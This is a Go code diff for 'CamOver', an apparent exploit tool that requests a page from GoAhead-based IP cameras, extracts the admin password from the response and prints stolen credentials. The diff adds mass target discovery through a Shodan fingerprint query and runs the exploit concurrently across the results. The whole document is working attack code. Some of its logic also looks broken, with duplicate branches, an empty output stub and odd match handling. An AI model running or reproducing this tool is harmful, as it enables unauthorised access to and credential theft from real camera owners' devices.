@@ -1,6 +1,7 @@
 package pkg
 
 import (
+	"context"
 	"crypto/tls"
 	"fmt"
 	"io/ioutil"
@@ -8,6 +9,8 @@ import (
 	"regexp"
 	"strings"
 	"sync"
+
+	"github.com/ns3777k/go-shodan/v4/shodan"
 )
 
 type CamOver struct {
@@ -24,7 +27,7 @@ type CamAccount struct {
 	password string
 }
 
-func (c *CamOver) Exploit(address string) (*CamAccount, error) {
+func (c *CamOver) Exploit(address string) (*CamAccount, bool, error) {
 	c.username = "admin"
 
 	transport := http.Transport{
@@ -41,13 +44,13 @@ func (c *CamOver) Exploit(address string) (*CamAccount, error) {
 
 	request, err := http.NewRequest(http.MethodGet, target, nil)
 	if err != nil {
-		return nil, err
+		return nil, false, err
 	}
 
 	resp, err := client.Do(request)
 
 	if err != nil {
-		return nil, err
+		return nil, false, err
 	}
 
 	defer resp.Body.Close()
@@ -67,30 +70,58 @@ func (c *CamOver) Exploit(address string) (*CamAccount, error) {
 				userIndex := strings.Index(string(val[index]), account.username)
 				account.password = string(val[userIndex+1])
 
-				return account, nil
+				return account, true, nil
 			} else {
 				continue
 			}
 		}
 	}
 
-	return nil, err
+	return nil, false, err
 }
 
-func (c *CamOverCli) thread(address string) bool {
-	account, err := c.CamOver.Exploit(address)
+func (c *CamOverCli) thread(address, output string) bool {
+	account, ok, err := c.CamOver.Exploit(address)
 	if err != nil {
 		return false
 	}
 
-	Success(fmt.Sprintf("username : %s - password : %s", account.username, account.password))
+	if ok {
+		if output == "" {
+			Success(fmt.Sprintf("username :: %s - password :: %s", account.username, account.password))
+			return true
+		} else {
+			Success(fmt.Sprintf("username :: %s - password :: %s", account.username, account.password))
+			return true
+		}
+	}
 
-	return true
+	return false
 }
 
-func (c *CamOverCli) outputResult(content string) {}
+func (c *CamOverCli) GetAddresesFromShodan(token string) []string {
+	var mathces []string
 
-func (c *CamOverCli) crack(addresses []string) {
+	client := shodan.NewClient(&http.Client{}, token)
+	resp, err := client.SearchQueries(context.Background(), &shodan.SearchQueryOptions{
+		Query: "GoAhead 5ccc069c403ebaf9f0171e9517f40e41",
+	})
+
+	if err != nil {
+		return []string{}
+	}
+
+	for _, matche := range resp.Matches {
+		r := matche.Query
+		mathces = append(mathces, r)
+	}
+
+	return mathces
+}
+
+func (c *CamOverCli) write2file(outputfile string) {}
+
+func (c *CamOverCli) crack(addresses []string, outputfile string) {
 	var wg sync.WaitGroup
 
 	for _, address := range addresses {
@@ -98,7 +129,7 @@ func (c *CamOverCli) crack(addresses []string) {
 		defer wg.Done()
 
 		go func(address string) {
-			ok := c.thread(address)
+			ok := c.thread(address, outputfile)
 			if ok {
 				Process("Found address : " + address)
 			} else {
